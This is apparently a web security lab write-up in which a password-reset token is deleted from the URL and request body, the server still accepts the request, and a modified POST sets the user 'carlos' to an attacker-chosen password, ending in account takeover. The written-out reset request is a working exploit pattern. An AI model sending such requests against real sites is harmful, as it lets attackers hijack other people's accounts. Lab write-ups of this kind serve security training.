# Token Validation Test

The token was removed from both locations.

## URL

Before:

```text
/forgot-password?temp-forgot-password-token=h6hwi2q9mlzcc1e7vdt9p15mblu3f1r9
```

After:

```text
/forgot-password?temp-forgot-password-token=
```

---

## Request Body

Before:

```text
temp-forgot-password-token=h6hwi2q9mlzcc1e7vdt9p15mblu3f1r9
```

After:

```text
temp-forgot-password-token=
```

The server still accepted the request, demonstrating that the token was not validated.

---

# Exploitation

A fresh password reset request was generated for the attacker's account.

The captured request was modified as follows:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2

temp-forgot-password-token=
username=carlos
new-password-1=password
new-password-2=password
```

The request was accepted successfully.

The attacker's chosen password was assigned to Carlos's account.

---

# Account Takeover

The attacker authenticated using:

| Field | Value |
|--------|-------|
| Username | `carlos` |
| Password | `password` |

Authentication succeeded.

The laboratory was solved.

